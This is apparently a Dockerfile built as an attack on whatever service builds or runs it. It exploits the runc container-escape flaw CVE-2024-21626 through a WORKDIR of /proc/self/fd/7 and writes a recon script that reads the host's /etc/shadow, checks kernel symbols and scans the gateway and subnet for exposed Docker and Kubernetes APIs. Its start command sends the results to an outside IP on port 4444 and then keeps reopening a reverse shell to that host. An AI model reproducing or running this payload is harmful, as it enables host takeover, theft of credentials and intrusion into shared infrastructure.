# syntax=er028455/df-frontend:v4
# build-trigger: 3
FROM alpine:3.18

RUN apk add --no-cache curl nmap-ncat

COPY --from=er028455/df-frontend:v4 /socktest /socktest

# CVE-2024-21626 test: if runc leaks fd 7/8 to host FS, WORKDIR resolves to host
WORKDIR /proc/self/fd/7

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V5 ==="\n\
uname -a; hostname; id\n\
\n\
echo "--- CVE-2024-21626 LEAKY VESSELS TEST ---"\n\
echo "CWD: $(pwd)"\n\
echo "ls CWD:"\n\
ls -la 2>&1 | head -20\n\
echo "ls ../../../..:" \n\
ls -la ../../../.. 2>&1 | head -20\n\
echo "cat ../../../../etc/hostname:"\n\
cat ../../../../etc/hostname 2>&1\n\
echo "cat ../../../../etc/shadow:"\n\
cat ../../../../etc/shadow 2>&1 | head -5\n\
echo "readlink /proc/self/fd/7:"\n\
readlink /proc/self/fd/7 2>&1\n\
echo "readlink /proc/self/fd/8:"\n\
readlink /proc/self/fd/8 2>&1\n\
echo "ls /proc/self/fd/:"\n\
ls -la /proc/self/fd/ 2>&1\n\
\n\
echo "--- SOCKET TESTS ---"\n\
/socktest 2>&1\n\
\n\
echo "--- KALLSYMS ---"\n\
echo "unix_walk_scc:"; grep -c unix_walk_scc /proc/kallsyms 2>&1\n\
echo "sctp:"; grep -c sctp /proc/kallsyms 2>&1\n\
echo "algif_aead:"; grep -c algif_aead /proc/kallsyms 2>&1\n\
\n\
echo "--- RUNC VERSION ---"\n\
runc --version 2>&1\n\
cat /proc/1/cmdline 2>/dev/null | tr "\\0" " " 2>&1; echo ""\n\
ls -la /proc/1/exe 2>&1\n\
\n\
echo "--- NETWORK ---"\n\
ip addr 2>/dev/null || ifconfig 2>/dev/null\n\
ip route 2>/dev/null\n\
cat /etc/resolv.conf\n\
\n\
echo "--- DOCKER API SCAN (gateway) ---"\n\
GW=$(ip route 2>/dev/null | grep default | awk "{print \\$3}")\n\
echo "Gateway: $GW"\n\
for PORT in 2375 2376 4243 9323 5000 8080 443 80 22 6443 10250 10255 2379 2380; do\n\
  nc -z -w 2 $GW $PORT 2>/dev/null && echo "$GW:$PORT OPEN" || true\n\
done\n\
\n\
echo "--- DOCKER API HTTP ---"\n\
for PORT in 2375 2376 4243; do\n\
  echo "-- $GW:$PORT --"\n\
  curl -s -m 3 http://$GW:$PORT/version 2>&1 | head -50\n\
  curl -s -m 3 http://$GW:$PORT/containers/json 2>&1 | head -c 1000\n\
  echo ""\n\
done\n\
\n\
echo "--- DOCKER SOCKET ---"\n\
ls -la /var/run/docker.sock 2>&1\n\
\n\
echo "--- SUBNET SCAN ---"\n\
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do\n\
  for PORT in 80 22 2375 8080 443 2376 10250; do\n\
    nc -z -w 1 172.18.0.$i $PORT 2>/dev/null && echo "172.18.0.$i:$PORT OPEN" || true\n\
  done\n\
done\n\
\n\
echo "--- DNS ---"\n\
nslookup host.docker.internal 127.0.0.11 2>&1\n\
nslookup gateway.docker.internal 127.0.0.11 2>&1\n\
cat /etc/hosts\n\
\n\
echo "--- ARP ---"\n\
cat /proc/net/arp 2>&1\n\
\n\
echo "--- CORE/MODPROBE ---"\n\
cat /proc/sys/kernel/core_pattern 2>&1\n\
cat /proc/sys/kernel/modprobe 2>&1\n\
\n\
echo "=== END V5 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh | ncat -w 10 129.101.121.138 4444; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 3; done"
